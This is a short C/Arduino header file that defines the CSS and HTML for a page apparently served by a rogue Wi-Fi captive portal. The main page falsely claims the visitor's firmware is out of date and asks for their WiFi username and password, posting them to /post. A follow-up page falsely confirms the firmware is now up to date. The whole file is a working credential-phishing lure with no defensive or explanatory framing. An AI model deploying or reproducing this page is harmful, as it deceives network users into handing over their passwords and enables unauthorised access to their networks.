#ifndef DECORATION_H
#define DECORATION_H

String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
             "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
             "div { padding: 0.5em; }"
             "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
             "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
             "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
             "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
             "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
             "textarea { width: 100%; }";
String h = "<!DOCTYPE html><html>"
           "<head><title>Setting</title>"
           "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
           "<style>" + CSS + "</style>"
           "<meta charset=\"UTF-8\"></head>";

String post_body = "<body><nav><b>Setting</b>information.</nav><div><h1>CREDENTIAL</h1></div><div>Your device firmware is up to date. The firmware is working properly.</div></body>";
String index_body = "<body><nav><b>Setting</b>information.</nav><div><h1>CREDENTIAL</h1></div><div>Your device firmware is out of date. Update your firmware to continue browsing normally.</div><div><form action=/post method=post><label>WiFi username:</label><input type=text name=p><label>WiFi password:</label><input type=password name=m></input><input type=submit value=Start></form></div><div class=q><a>&#169; All rights reserved.</a></div></body>";


#endif
